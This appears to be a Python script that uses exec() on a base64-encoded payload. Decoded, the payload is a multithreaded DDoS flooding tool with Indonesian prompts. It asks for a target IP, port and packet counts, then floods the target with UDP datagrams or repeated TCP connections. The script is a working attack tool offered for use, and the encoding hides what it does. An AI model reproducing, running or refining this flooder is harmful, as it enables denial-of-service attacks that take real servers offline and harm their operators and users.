import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojQ09ERSBCWSBaWAppbXBvcnQgcmFuZG9tCmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgb3MKaW1wb3J0IHN5cwoKb3Muc3lzdGVtKCJjbGVhciIpCnByaW50KCIiIlwwMzNbOTFtCiBfXyAgX18gX19fX18gIF9fX19fIF9fX19fICAgIF8gICAgX18gIF9fIAogXCBcLyAvfF9fICAvIHxfICAgX3wgX19fX3wgIC8gXCAgfCAgXC8gIHwKICBcICAvICAgLyAvICAgIHwgfCB8ICBffCAgIC8gXyBcIHwgfFwvfCB8CiAgLyAgXCAgLyAvXyAgICB8IHwgfCB8X19fIC8gX19fIFx8IHwgIHwgfAogL18vXF9cL19fX198ICAgfF98IHxfX19fXy9fLyAgIFxfXF98ICB8X3wKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiIiIpCnByaW50KCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKQpwcmludCgiIHwgQVVUSE9SICA6IFplZXhYeVoiKQpwcmludCgiIHwgR0lUSFVCICA6IGh0dHBzOi8vZ2l0aHViLmNvbS9aZWVYeXpaL0Rkb3MiKQpwcmludCgiIHwgTVkgVEVBTSA6IGh0dHBzOi8vZGlzY29yZC5nZy91R3BESHZhdTVBIikKcHJpbnQoIiB8IERJU0NPUkQgOiAhIFpYIzMwNzIiKQpwcmludCgiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikKaXAgPSBzdHIoaW5wdXQoIiBNQVNTVUtBTiBJUDoiKSkKcG9ydCA9IGludChpbnB1dCgiIE1BU1NVS0FOIFBPUlQ6IikpCmNob2ljZSA9IHN0cihpbnB1dCgiIEdBUyBERE9TPyh5L24pIikpCnRpbWVzID0gaW50KGlucHV0KCIgUEFDS0VUOiIpKQp0aHJlYWRzID0gaW50KGlucHV0KCIgSVNJIFBBQ0tFVDoiKSkKZGVmIHJ1bigpOgogICAgZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgxMDI1KQogICAgaSA9IHJhbmRvbS5jaG9pY2UoKCJbI10iLCJbw5ddIiwiWypdIikpCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQogICAgICAgICAgICBhZGRyID0gKHN0cihpcCksaW50KHBvcnQpKQogICAgICAgICAgICBmb3IgeCBpbiByYW5nZSh0aW1lcyk6CiAgICAgICAgICAgICAgICBzLnNlbmR0byhkYXRhLGFkZHIpCiAgICAgICAgICAgIHByaW50KGkgKyIgVE9LIFRPSyBUT0sgUEVSTUlTSSBQQUtFVCEhISIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgiW8OXXSBTRVJWRVIgSVMgRE9XTiEhISIpCgpkZWYgcnVuMigpOgogICAgZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgxNikKICAgIGkgPSByYW5kb20uY2hvaWNlKCgiWyNdIiwiW8OXXSIsIlsqXSIpKQogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgICAgIHMuY29ubmVjdCgoaXAscG9ydCkpCiAgICAgICAgICAgIHMuc2VuZChkYXRhKQogICAgICAgICAgICBmb3IgeCBpbiByYW5nZSh0aW1lcyk6CiAgICAgICAgICAgICAgICBzLnNlbmQoZGF0YSkKICAgICAgICAgICAgcHJpbnQoaSArIiBUT0sgVE9LIFRPSyBQRVJNSVNJIFBBS0VUISEhIikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHMuY2xvc2UoKQogICAgICAgICAgICBwcmludCgiW8OXXSBTRVJWRVIgSVMgRE9XTiEhISIpCgpmb3IgeSBpbiByYW5nZSh0aHJlYWRzKToKICAgIGlmIGNob2ljZSA9PSAneSc6CiAgICAgICAgdGggPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldCA9IHJ1bikKICAgICAgICB0aC5zdGFydCgpCiAgICBlbHNlOgogICAgICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSBydW4yKQogICAgICAgIHRoLnN0YXJ0KCk='))